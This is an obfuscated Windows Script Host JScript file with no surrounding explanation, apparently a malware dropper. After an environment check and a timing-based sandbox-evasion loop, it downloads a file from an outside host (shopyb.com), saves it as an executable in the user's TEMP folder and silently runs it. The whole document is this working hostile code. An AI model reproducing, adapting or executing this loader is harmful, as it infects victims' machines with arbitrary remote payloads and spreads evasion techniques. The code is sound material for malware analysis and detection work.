var _DB = false;
var _P = "CreateObject";
var _GK = function _TD() {return WScript[_P]("WScript"+".Shell");}(), _S0 = 11;
var _J = "MSXML2.XMLHTTP";
var _NB = 2123213;
var _Q = 0;
function _V(_T1){_GK["Run"](_T1, _Q, _Q);};
function _G(){return _J + "";};
function _BK(_B, _PD){_Q = _Q * 1; return _B - _PD;};
function _BC(){return _P;};
/*@cc_on
  @if (@_win32 || @_win64)
    _DB = true;
  @end
@*/
if (_DB)
{
var _ZJ = "";
function _AL(){return 22;};
var _ES = 0; var _S = 0;
function _R()
{
var _U = new this["Date"]();
var _I = _U["getUTCMilliseconds"]();
WScript["Sleep"](_AL());
var _U = new this["Date"]();
var _O = _U["getUTCMilliseconds"]();
WScript["Sleep"](_AL());
var _U = new this["Date"]();
var _CR = _U["getUTCMilliseconds"]();
var _ES = "_C0";
_ES = _BK(_O, _I);
var _S = "_L";
_S = _BK(_CR, _O);
_ZJ = "open";
return _BK(_ES, _S);
}
var _FX = false;
var _I0 = false;
for (var _T0 = _Q; _T0 < _AL() * 1; _T0++){if (_R() != _Q){
_FX = true; 
_S = "31" + 11 * _ES + _S; 
_I0 = true; 
break;
}}
function _E() {return ((_FX == true) && (_FX == _I0)) ? 1 : _Q;};
if (_FX && _E() && _I0){
function _VK() {return _GK["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "dfQpfEPwp.ex" + "e";};
 _SH = _G();
 _OT = WScript[_P](_SH);
 var _C = 1;
 while (_C){
try {
	if (_C == 1)
	{
		_OT[_ZJ]("GET", "http://shopyb.com/s6dlas", false);
		_OT["send"]();
		_W = "Sleep";
	}
	WScript[_W](_AL() + 120); 
	if (_OT["readystate"] < 2 * 2) continue;
	_C = _Q;
	function _QO(_T) {var _D = (1, 2, 3, 4, 5, _T); return _D;};
	_J0 = WScript[_BC()]("ADODB.Stream");
	_SH = _J0;
	_SH[_ZJ]();
	_SH["type"] = _QO(1);
	_SH["write"](_OT["ResponseBody"]);
	_J0["position"] = _QO(_Q);
	_SH["Save" + "ToFile"](_VK(), 2);
	_J0["cl"+"ose"]();
	_RS = _VK();
	_V(_RS);
} catch(_C1){};
}
}
}

